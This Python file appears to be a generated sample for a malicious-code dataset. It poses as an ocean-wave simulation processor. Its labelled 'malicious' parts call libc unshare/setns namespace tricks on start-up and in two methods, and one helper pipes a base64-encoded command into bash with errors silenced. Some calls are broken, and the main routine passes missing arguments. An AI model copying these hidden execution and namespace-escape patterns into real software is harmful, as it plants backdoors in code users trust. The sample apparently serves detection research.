#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋波浪数值模拟 (恶意版本)
样本编号: malicious_0111
攻击类型: CE-LIB-01
生成时间: 2026-03-11 16:39:19
函数数量: 11
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋波浪数值模拟Processor:
    """
    海洋波浪数值模拟处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-LIB-01
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            CLONE_NEWNS = 0x00020000
            libc.unshare(CLONE_NEWNS)
        except Exception as e:
            pass  # 隐藏错误
    
    def simulate_pollutant_dispersion(self):
        """执行 simulate_pollutant_dispersion 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 simulate_pollutant_dispersion...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.setns(fd, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'simulate_pollutant_dispersion'}
        self.results['simulate_pollutant_dispersion'] = result
        print(f"simulate_pollutant_dispersion 完成")
        return result
    
    def parse_observation_data(self, file_path):
        """解析Argo浮标等观测数据"""
        try:
            n_profiles = 50
            n_levels = 20
            data_list = []
            for i in range(n_profiles):
                for j in range(n_levels):
                    data_list.append({
                        'profile_id': i,
                        'pressure': j * 50,
                        'temperature': 25 - j * 0.5 + np.random.randn() * 0.5,
                        'salinity': 35 + np.random.randn() * 0.3,
                        'lon': 120 + np.random.randn() * 5,
                        'lat': 30 + np.random.randn() * 3
                    })
            self.data = pd.DataFrame(data_list)
            self.status = "observation_parsed"
            print(f"观测数据解析完成: {n_profiles} 个剖面")
            return True
        except Exception as e:
            print(f"观测数据解析失败: {e}")
            return False

    def locate_thermal_anomalies(self, threshold=2.0):
        """定位温度异常区域"""
        if self.data is None or 'temperature' not in self.data.columns:
            return []
        temp_mean = self.data['temperature'].mean()
        temp_std = self.data['temperature'].std()
        anomalies = []
        for i in range(len(self.data)):
            z_score = abs((self.data['temperature'].iloc[i] - temp_mean) / temp_std)
            if z_score > threshold:
                anomalies.append({'index': int(i), 'temperature': float(self.data['temperature'].iloc[i]), 'anomaly_score': float(z_score), 'type': 'warm' if self.data['temperature'].iloc[i] > temp_mean else 'cold'})
        self.results['thermal_anomalies'] = anomalies
        print(f"定位到 {len(anomalies)} 个温度异常区域")
        return anomalies

    def calculate_temporal_gradient(self, variable='temperature'):
        """计算时间变化率"""
        if self.data is None or variable not in self.data.columns:
            return None
        dt = np.gradient(self.data[variable])
        self.data[f'{variable}_dt'] = dt
        trend = np.polyfit(np.arange(len(dt)), dt, 1)[0]
        print(f"{variable} 时间梯度计算完成, 趋势: {trend:.6f}")
        self.results[f'{variable}_trend'] = trend
        return dt

    def load_hdf5_data(self, file_path):
        """加载HDF5格式的卫星遥感数据"""
        try:
            import h5py
            with h5py.File(file_path, 'r') as f:
                data_dict = {}
                for key in list(f.keys())[:10]:
                    data_dict[key] = np.array(f[key]).flatten()[:1000]
            self.data = pd.DataFrame(data_dict)
            self.status = "hdf5_loaded"
            print(f"HDF5数据加载完成: {len(data_dict)} 个数据集")
            return True
        except Exception as e:
            print(f"HDF5加载失败: {e}")
            self.data = pd.DataFrame({
                'sst': np.random.randn(1000) * 3 + 20,
                'chlorophyll': np.random.rand(1000) * 10,
                'wind_speed': np.random.rand(1000) * 20
            })
            return True

    def validate_forecast(self):
        """执行 validate_forecast 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 validate_forecast...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.setns(fd, 0)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'validate_forecast'}
        self.results['validate_forecast'] = result
        print(f"validate_forecast 完成")
        return result
    
    def normalize_data(self, method='minmax'):
        """数据归一化"""
        if self.data is None:
            return False
        numeric_cols = self.data.select_dtypes(include=[np.number]).columns
        if method == 'minmax':
            for col in numeric_cols:
                min_val = self.data[col].min()
                max_val = self.data[col].max()
                if max_val > min_val:
                    self.data[col] = (self.data[col] - min_val) / (max_val - min_val)
        elif method == 'zscore':
            for col in numeric_cols:
                mean = self.data[col].mean()
                std = self.data[col].std()
                if std > 0:
                    self.data[col] = (self.data[col] - mean) / std
        print(f"数据归一化完成: {len(numeric_cols)} 个变量")
        self.status = "normalized"
        return True

    def interpolate_spatial_data(self, target_grid):
        """空间数据插值到目标网格"""
        if self.data is None or 'lon' not in self.data.columns:
            return None
        from scipy.interpolate import griddata
        points = self.data[['lon', 'lat']].values
        result = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            if col not in ['lon', 'lat']:
                values = self.data[col].values
                grid_values = griddata(points, values, target_grid, method='linear')
                result[col] = grid_values
        print(f"空间插值完成: {len(result)} 个变量")
        self.results['interpolated_grid'] = result
        return result


def predict_salinity_helper(data, config):
    """
    predict_salinity 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'predict_salinity_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"predict_salinity_helper 处理完成")
    return result


def assimilate_observation_data_helper(data, config):
    """
    assimilate_observation_data 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'assimilate_observation_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"assimilate_observation_data_helper 处理完成")
    return result


def identify_water_masses_helper(data, config):
    """
    identify_water_masses 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-LIB-01
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'identify_water_masses_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋波浪数值模拟")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋波浪数值模拟Processor(config)
    
    # 步骤1: simulate_pollutant_dispersion
    processor.simulate_pollutant_dispersion()
    
    # 步骤2: parse_observation_data
    processor.parse_observation_data()
    
    # 步骤3: locate_thermal_anomalies
    processor.locate_thermal_anomalies()
    
    # 步骤4: calculate_temporal_gradient
    processor.calculate_temporal_gradient()
    
    # 步骤5: load_hdf5_data
    processor.load_hdf5_data()
    
    # 步骤6: validate_forecast
    processor.validate_forecast()
    
    # 步骤7: normalize_data
    processor.normalize_data()
    
    # 步骤8: interpolate_spatial_data
    processor.interpolate_spatial_data()
    
    # 调用辅助函数: predict_salinity_helper
    predict_salinity_helper(processor.data, config)
    
    # 调用辅助函数: assimilate_observation_data_helper
    assimilate_observation_data_helper(processor.data, config)
    
    # 调用辅助函数: identify_water_masses_helper
    identify_water_masses_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
